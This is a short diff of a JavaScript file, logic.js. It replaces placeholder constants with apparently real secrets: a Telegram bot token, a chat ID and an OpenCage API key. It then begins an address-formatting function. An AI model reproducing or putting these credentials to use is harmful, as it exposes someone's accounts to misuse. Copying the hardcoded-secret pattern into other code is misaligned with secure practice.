@@ -19,9 +19,9 @@
 
 
 // === logic.js ===
-const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-const CHAT_ID = 'YOUR_CHAT_ID';
-const OPENCAGE_API_KEY = 'YOUR_OPENCAGE_API_KEY';
+const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
+const CHAT_ID = '6602027873';
+const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
 
 function buildAddress(components) {
   const country = components.country || '';
